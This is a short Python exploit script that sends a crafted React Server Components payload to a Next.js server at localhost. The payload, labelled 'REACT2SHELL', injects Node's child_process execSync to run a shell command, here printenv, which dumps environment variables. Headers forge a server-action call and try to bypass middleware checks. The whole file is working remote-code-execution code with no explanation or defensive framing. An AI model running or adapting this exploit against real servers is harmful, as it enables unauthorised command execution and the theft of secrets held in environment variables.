
import requests

target = "http://localhost:3001"
command = "printenv"

# Malicious Flight Payload
payload = f'''0:{{"a":"$@1","f":"","b":"development"}}
1:E{{"digest":"${{require('child_process').execSync('{command}').toString()}}","message":"REACT2SHELL","stack":[],"environmentName":"Server"}}'''

headers = {
    "Content-Type": "text/x-component", # Essential for RSC
    "RSC": "1",
    "Next-Action": "603d06a328aa137d98e1471d3d006892c98c841579",                 # Triggers action handler
    "x-middleware-subrequest": "1",     # Bypass middleware checks if present
}

print(f"[*] Sending payload to {target}...")
response = requests.post(f"{target}/compiler", headers=headers, data=payload)

print("[+] Response:")
print(response.text)
